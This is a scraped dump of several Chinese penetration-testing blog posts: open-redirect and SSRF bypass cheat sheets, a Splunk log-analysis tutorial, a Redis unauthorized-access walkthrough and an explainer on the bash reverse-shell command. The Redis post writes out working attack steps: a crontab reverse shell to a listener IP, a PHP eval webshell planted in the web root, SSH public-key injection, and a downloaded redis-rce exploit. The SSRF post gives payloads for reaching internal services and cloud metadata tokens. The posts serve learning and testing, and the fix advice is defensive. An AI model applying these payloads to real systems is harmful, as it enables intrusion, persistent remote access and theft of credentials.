同样是在它本身域名前加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址。如：http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com一个反斜杠绕过方法如：http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com另一种思路，一个反斜杠一个点利用.这样的格式，也就是一个反斜杠加一个点来跳过限制，如：http://www.aaa.com/acb?Url=http://test.com.login.aaa.com 1payload：/ \\ . 0x03 利用@绕过URL限制 如果你用这方法在火狐里进行跳转，会有弹窗提示，在其它游览器则没有。如：&lt;a href=”http://www.aaa.com/acb?Url=http://login.aaa.com@test.com“”&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com 后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的。 1payload：@ 0x04 利用白名单缺陷绕过限制 有的域名白名单限制是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧。为什么这么说呢，这个问题就是白名单限制不当，比如，当跳转的域名包含这个网站下的所有域名，比如：http://www.aaa.com/acb?Url=http://login.aaa.com这个login.aaa.com也可以改成aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。那么当我在这个域名前面加上如testaaa.com，白名单里会检查是否包含aaa.com这个域名，如果包含，就直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com这个域名就可以利用这个跳转。 1Payload:testaaa.com 0x05 多重验证&amp;跳转绕过限制 现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL很可能存在任意跳转的问题。多重跳转的问题导致可绕过URL限制比如http://www.aaa.com/acb?Url=http: … ttp://login.aaa.com当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。 0x06 点击触发达到绕过URL跳转限制 比如很多登陆页面的地方，其URL是一个跳转的URL如：http://www.aaa.com/acb?Url=http://test.com你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转。当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。 0x07 利用xip.io绕过 这个我还没有在测试中应用过，其请求是http://www.127.0.0.1.xip.io 这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，http://www.qq.com.127.0.0.1.xip.io当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址。 0x08 利用超链接绕过可信站点限制 比如一个URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的。只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了，难道就这样错失一个URL跳转漏洞了？其实不然，只要你的URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx因为你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL。当然，百度这个302有点长，你给它进行加密就行。 0x09 POST参数中的URL跳转 当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交。当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步。这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX。当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息。为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。当然，如果POST参数里就只是URL跳转参数，那么你可以给它转成GET方式，然后进行跳转就可以了，只要网站支持这样的GET方式就行。在Burp Suite里可以一键转换提交方式，右键选择Change request method就可以！ 0x10 利用#号绕过 如：http://www.aaa.com/acb?Url=http://test.com#login.aaa.com 0x09 FUZZ 重定向Payloads by @cujanovichttps://github.com/cujanovic/Open-Redirect-Payloads 重定向参数 by @fuzzdb-projecthttps://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"SSRF绕过的方法","slug":"渗透测试-SSRF绕过的方法","date":"2019-07-19T06:25:40.000Z","updated":"2019-10-17T14:57:40.371Z","comments":true,"path":"2019/07/19/渗透测试-SSRF绕过的方法/","link":"","permalink":"http://www.vkxss.top/2019/07/19/渗透测试-SSRF绕过的方法/","excerpt":"","text":"1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复 1.9 参考文章 1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 1.2、漏洞寻找： 分享功能，通过 URL 地址分享网页内容 早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的标签或者标签中content的文本内容作为显示以提供更好的用户体验 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务 在线翻译：通过URL地址翻译对应文本的内容。 提供此功能的国内公司有百度、有道等 图片加载与下载：通过URL地址加载或下载图片 图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题） 图片、文章收藏功能 此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载 未公开的api实现以及其他调用URL的功能 此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。 数据库内置功能：数据库的比如mongodb的copyDatabase函数 邮件系统：比如接收邮件服务器地址 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。 文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。 链接扩展: 最近Mark Litchfield在推特扩展链接上发现了漏洞，名声大涨。 文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。例子 PDF生成器：试着注入指向内部服务的&lt;iframe&gt;&lt;img&gt;,&lt;base&gt;或者&lt;script&gt;元素或者CSS的url()函数。 1.3 漏洞验证 排除法：浏览器f12查看源代码看是否是在本地进行了请求 1比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 dnslog等工具进行测试，看是否被访问 1可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址 12从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址通过二级域名暴力猜解工具模糊猜测内网地址 直接返回的Banner、title、content等信息 留意bool型SSRF 1.4 利用方式 让服务端去访问相应的网址 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms 可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件 攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}） 攻击内网应用程序（利用跨协议通信技术） 判断内网主机是否存活：方法是访问看是否有端口开放 ​- 某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。 12345URL parameter Response HTTP status RTT Conclusionhttp://127.0.0.1:22 200 10ms Port is openhttp://127.0.0.1:23 500 10ms Port is closedhttp://10.0.0.1/ 500 30010ms Firewalled or unable to route traffic to serverhttp://10.0.0.1:8080/ 500 10ms Port is closed and traffic is routed to server 对于开放和关闭的端口，每个SSRF响应都不同。试着以不同的响应为基础建立一个开放、闭合端口和标志符之间的映射。上面的表格就是一个例子。 DoS攻击（请求大文件，始终保持连接keep-alive always） 提取EC2配置文件 越来越多的公司将部分基础设施放到亚马逊的EC2服务器上。亚马逊公开内部服务，每台EC实例都能查询主机元数据。这是AWS文档。如果你在EC2上发现了SSRF漏洞，试着请求http://169.254.169.254/latest/meta-data。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API token等等。你也可以下载_ http://169.254.169.254/latest/user-data_和解压数据。 1.5、漏洞利用示例： 某度翻译SSRF： 某短网址SSRF： 1.6、Bypass 1.4.1 攻击本地 12http://127.0.0.1:80http://localhost:22 1.4.2利用[::] 123利用[::]绕过localhosthttp://[::]:80/ &gt;&gt;&gt; http://127.0.0.1也有看到利用http://0000::1:80/的，但是我测试未成功 1.4.3利用@ 123http://example.com@127.0.0.1http://A.com:B@127.0.0.1127.0.0.1#http://abc 1.4.4利用短地址 1234（1）百度短网址转换：https://dwz.cn #不支持ip http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1 （2）TinyURL：https://tinyurl.com/create.php #支持ip 1.4.5利用特殊域名 12345678910111213利用的原理是DNS解析http://127.0.0.1.xip.io/http://www.owasp.org.127.0.0.1.xip.io/http://mysite.127.0.0.1.xip.iohttp://foo.bar.127.0.0.1.xip.io#利用ssrf.php?url=http://127.0.0.1.xip.io/orssrf.php?url=http://www.127.0.0.1.xip.io/orssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/orssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info 1.4.6 利用DNS解析 1域名上设置A记录，指向127.0.1 1.4.7 利用上传 1234也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 例子 1.4.8 利用Enclosed alphanumerics 1234567891011利用Enclosed alphanumericshttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; http://example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 1.4.9 利用句号 1http://127。0。0。1 &gt;&gt;&gt; http://127.0.0.1 1.4.10 利用进制转换 – IP进制转换地址：转换地址 12345678910111213141516171819可以是十六进制，八进制等。115.239.210.26 &gt;&gt;&gt; 16373751032首先把这四段数字给分别转成16进制，结果：73 ef d2 1a然后把 73efd21a 这十六进制一起转换成8进制记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0xIP转换为-16进制-记得访问的时候加0X表示使用16进制http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001IP转换为-16进制-转换为八进制-记得访问的时候加0表示使用八进制http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001127转换为8进制：http://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/ip地址转换为10进制：http://127.0.0.1 &gt;&gt;&gt; http://2130706433/http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 12345678910111213#ip:127.0.0.1（1）8进制格式：0177.0.0.1（2）16进制格式：0x7F.00.00.01（3）8进制整数格式：017700000001（3）10进制整数格式：2130706433（4）16进制整数格式：0x7f000001#转换方法8进制前加0，16进制前加0x将ip的每一位由十进制转换为二进制，再将二进制转换为八进制或十六进制关于整数格式：ipv4是32位二进制数，将其转换为32位二进制数，再将其转换为十进制或十六进制 1.4.11 利用特殊地址 1http://0/ 1.4.12 利用协议 1234567891011Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 1.4.13 利用301或者302跳转 123http://www.th1s.cn/test/ssrf.phpssrf.php里面的内容为：&lt;?php header(&apos;Location:10.1.1.1&apos;);?&gt; 1.4.14 使用组合 各种绕过进行自由组合即可 参考链接： 12345678910https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRFhttps://twitter.com/albinowax/status/890725759861403648http://blog.safebuff.com/2016/07/03/SSRF-Tips/https://hackerone.com/reports/115748https://www.dailysecurity.fr/server-side-request-forgery/https://twitter.com/EdOverflowhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injectionhttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfhttp://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/http://blog.csdn.net/xinianbuxiu/article/details/53560417 1.7 SSRF危害 主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的Banner信息。 攻击运行在内外网主机的应用程序。 通过访问默认文件对内网 Web 应用进行指纹识别。 攻击内外网的 Web 应用，主要是使用 GET参数就可以实现的攻击。 利用file协议读取本地文件。 1.8 漏洞修复 禁止302跳转 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 限制请求的端口为http常用的端口，比如 80、443、8080、8090 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 1.9 参考文章 SSRF学习笔记 ssrf攻击内网应用 SSRF 学习笔记 gopher 协议攻击内网 mysql gopher SSRF攻击内网应用复现","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"日志分析神器_Splunk","slug":"应急-日志分析神器_Splunk","date":"2019-06-12T07:30:08.000Z","updated":"2019-09-20T02:00:53.772Z","comments":true,"path":"2019/06/12/应急-日志分析神器_Splunk/","link":"","permalink":"http://www.vkxss.top/2019/06/12/应急-日志分析神器_Splunk/","excerpt":"","text":"0x01安装 0x02日志分析 0x03分析案例 0x03.1 Splunk 名词说明 0x03.2 案例 案例一：统计-top 0x01安装 搭建系统环境 16.04.1-Ubuntu-64 Splunk splunk-7.3.0-657388c7a488-Linux-x86_64 下载解压（想要安装包请留言），如下图所示： 解压完后，cd到splunk/bin目录下启动，然后需要输入web登录的账户和密码，成功如下图所示： 1运行命令:sudo ./splunk start 查看虚拟机IP，在本地浏览器访问，输入自己设置的账户和密码即可： 0x02日志分析 载入需要分析的日志，一直下一步即可，注意修改下主机字段值，方便查找，最后点击提交即可： 0x03分析案例0x03.1 Splunk 名词说明12345678910Data Input : 添加数据 （文件或文件目录、TCP、UDP、WMI、Script, Forwarder…）Source type ： 来源类型 （apache logs, security log、network log…）Host ：主机 （apache1、apche2, apcahe3…) Source：数据源 （/opt/apache/log/*.*）Index：索引（Splunk 索引）Field：字段： 正则表达式 (Regular Expression) 取出符合某个条件字段Search Language：搜索语句 （缩小范围 -&gt; 计算 -&gt; 呈现 ）Saved Search： 搜索语句储存，未来可以直接使用Report ： 報表，搜索结果 -&gt; 图形报表Alert：告警，搜索结果通报 0x03.2 案例案例一：统计-top 分析状态码为200、攻击者前10的IP地址，如下图所示：","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://www.vkxss.top/categories/应急响应/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"http://www.vkxss.top/tags/应急响应/"}]},{"title":"Redis未授权访问漏洞之ubuntu反弹shell问题","slug":"渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题","date":"2019-05-28T06:25:40.000Z","updated":"2019-12-12T07:56:19.135Z","comments":true,"path":"2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/","link":"","permalink":"http://www.vkxss.top/2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/","excerpt":"","text":"0x00 背景 0x01 环境准备 0x02 具体过程 0x02.1 安装redis 0x02.2 修改远程登陆配置文件 0x02.3 攻击利用 0x02.4 利用计划任务执行命令反弹shell 扩展思路 下载后放到 redis-rce 目录下 此处可以通过 -p 去设置目标端口（默认6379） 参考链接 0x00 背景 在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题。 0x01 环境准备 ubuntu16.04，用来任务计划反弹shell的靶机 MAC，用来接收ubuntu反弹过来的shell redis4.0.10未授权访问漏洞 0x02 具体过程0x02.1 安装redis 安装：下载、解压、编译 12345$ wget http://download.redis.io/releases/redis-4.0.10.tar.gz$ tar xzf redis-4.0.10.tar.gz$ mv redis-4.0.10 /usr/local/redis$ cd /usr/local/redis$ make 创建服务：二进制文件是编译完成后在src目录下，客户端是/usr/local/redis/src/redis-cli，服务器是/usr/local/redis/src/redis-server。下面为这两个文件做软链接。 12$ ln -s /usr/local/redis/src/redis-cli /usr/bin/redis$ ln -s /usr/local/redis/src/redis-server /usr/bin/redisd 测试是否成功安装 至此，表明你的redis已经安装完毕。 0x02.2 修改远程登陆配置文件123456789$ vim /usr/local/redis/redis.conf 配置文件 bind 127.0.0.1前面加上#号 protected-mode设为no $ 启动服务 redisd /usr/local/redis/redis.conf注释：- 关闭protected-mode模式，此时外部网络可以直接访问- 开启protected-mode保护模式，需配置bind ip或者设置访问密码- redis.conf配置文件中daemonize守护线程，默认是NO 默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件！！ 0x02.3 攻击利用 redis基本命令 123456789101112131415161718192021连接redis：redis-cli -h 192.168.1.108查看redis版本信息、一些具体信息、服务器版本信息等等：192.168.1.108:6379&gt;info将变量x的值设为test：192.168.1.108:6379&gt;set x &quot;test&quot;获取设置的某个变量的值：192.168.1.108:6379&gt;get x`flushall`是把整个redis数据库删除，一般情况下不要用！！！192.168.1.108:6379&gt;flushall查看所有键：192.168.1.108:6379&gt;KEYS *获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。192.168.1.108:6379&gt;CONFIG GET dir192.168.1.108:6379&gt;CONFIG GET dbfilename 0x02.4 利用计划任务执行命令反弹shell 在redis以root权限运行时可以写crontab来执行命令反弹shell 1234567891011121314151617先在自己的服务器上监听一个端口nc -lvnp 7999然后执行命令:root@kali:~# redis-cli -h 192.168.1.108192.168.1.108:6379&gt; set xx &quot;\\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\\n&quot;OK192.168.1.108:6379&gt; config set dir /var/spool/cron/OK192.168.1.108:6379&gt; config set dbfilename rootOK192.168.1.108:6379&gt; saveOK 1234567891011再次科普下：m:分钟 - 从0到59的整数h:小时 - 从0到23的整数dom:天 - 从1到31的整数 (必须是指定月份的有效日期)mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)user:指的是执行命令的用户command: 需要执行的命令星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务 12345ubuntu下可以利用的cron有以下几个地方：/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计 登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。 – 我们手动把乱码删除，发现依然无法成功反弹shell。这是为什么呢？ 通过视频资料发现ubantu下默认使用/bin/dash执行脚本的问题，解决方式:将shell环境修改为bash。 成功反弹shell 扩展思路 利用Redis未授权访问写定时任务反弹shell 利用Redis未授权访问写webshell 通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为/var/www/html 1234set xx &quot;\\n\\n\\&lt;?php @eval($_POST[&apos;test&apos;]);?&gt;\\n\\n&quot;config set dir /var/www/htmlconfig set dbfilename shell.phpsave 利用redis未授权访问向远程服务器写入ssh公钥 12345678910111213在本地生成一对密钥：$ ssh-keygen -t rsa然后将公钥写入 key.txt 文件$ (echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt之后利用redis未授权访问漏洞将公钥写到/root/.ssh/id_rsa文件中$ cat key.txt | redis-cli -h ip -x set crackit接下来在redis-cli的交互式shell下执行config set dir /root/.sshconfig get dirconfig set dbfilename &quot;authorized_keys&quot;save这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行$ ssh –i id_rsa root@ip Redis 基于主从复制的RCE利用方式 https://lorexxar.cn/2019/07/10/redis-5-x-rce/ 什么是Redis主从复制 Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 漏洞利用 下载Exp git clone https://github.com/Ridter/redis-rce.git 下载 exp.so 下载后放到 redis-rce 目录下 wget –no-chck-certificate https://github.com/n0b0dyCN/redis-rogue-server/raw/master/exp.so 利用 此处可以通过 -p 去设置目标端口（默认6379） python redis-rce.py -r &lt;目标IP&gt; -L &lt;监听的公网IP&gt; -P &lt;监听的公网端口&gt; -f exp.so 利用redis未授权访问远程命令执行 https://github.com/vkbiu/CVE/tree/master/redis-rce 参考链接 https://www.ixigua.com/i6590668394092036612/#mid=1568076190183425 https://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"深入理解bash反弹shell命令","slug":"渗透测试-深入理解bash反弹shell命令","date":"2019-05-20T07:30:08.000Z","updated":"2019-10-11T10:39:53.461Z","comments":true,"path":"2019/05/20/渗透测试-深入理解bash反弹shell命令/","link":"","permalink":"http://www.vkxss.top/2019/05/20/渗透测试-深入理解bash反弹shell命令/","excerpt":"","text":"0x00 首先了解下shell 0x01 bash反弹shell 0x001 关于-i 0x002 关于&gt;&amp; 0x003 关于0&gt;&amp;1 0x004 关于 /dev/tcp/host/port 0x00 首先了解下shell Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。 以下是几种shell版本，bash是默认的： sh(全称 Bourne Shell): 是UNIX最初使用的 shell，而且在每种 UNIX 上都可以使用。Bourne Shell 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种 shell。bash（全称 Bourne Again Shell）: LinuxOS 默认的，它是 Bourne Shell 的扩展。与 Bourne Shell 完全兼容，并且在 Bourne Shell 的基础上增加了很多特性。可以提供命令补全，命令编辑和命令历史等功能。它还包含了很多 C Shell 和 Korn Shell 中的优点，有灵活和强大的编辑接口，同时又很友好的用户界面。 csh(全称 C Shell): 是一种比 Bourne Shell更适合的变种 Shell，它的语法与 C 语言很相似。Tcsh: 是 Linux 提供的 C Shell 的一个扩展版本。Tcsh 包括命令行编辑，可编程单词补全，拼写校正，历史命令替换，作业控制和类似 C 语言的语法，他不仅和 Bash Shell 提示符兼容，而且还提供比 Bash Shell 更多的提示符参数。ksh (全称 Korn Shell): 集合了 C Shell 和 Bourne Shell 的优点并且和 Bourne Shell 完全兼容。pdksh: 是 Linux 系统提供的 ksh 的扩展。pdksh 支持人物控制，可以在命令行上挂起，后台执行，唤醒或终止程序。 0x01 bash反弹shell 对于bash反弹shell这条命令，相信很多人都很熟悉了: 1/bin/bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1 但是这里面的每个细节是否都清楚了，这可就不一定了 0x001 关于-i 12root@kali:~# man bash | grep -E &quot;\\-i&quot; -i If the -i option is present, the shell is interactive. 首先 -i 是交互的模式，但是发现其实不用-i参数也是可以的，因为bash就是处理用户交互的 0x002 关于&gt;&amp; 1234567891011121314151617181920212223242526272829303132root@kali:~# man bash | grep &quot;Redirecting Standard Output and Standard Error&quot; -A 30 Redirecting Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word. There are two formats for redirecting standard output and standard error: &amp;&gt;word and &gt;&amp;word Of the two forms, the first is preferred. This is semantically equiva‐ lent to &gt;word 2&gt;&amp;1 When using the second form, word may not expand to a number or -. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons. Appending Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be appended to the file whose name is the expansion of word. The format for appending standard output and standard error is: &amp;&gt;&gt;word This is semantically equivalent to 看bash的文档，可以看到，这个是将标准输出和标准错误都重定向了跟 &gt;word 2&gt;&amp;1 的效果是一致的 当然我们用 &amp;&gt; 也是可以的 0x003 关于0&gt;&amp;1 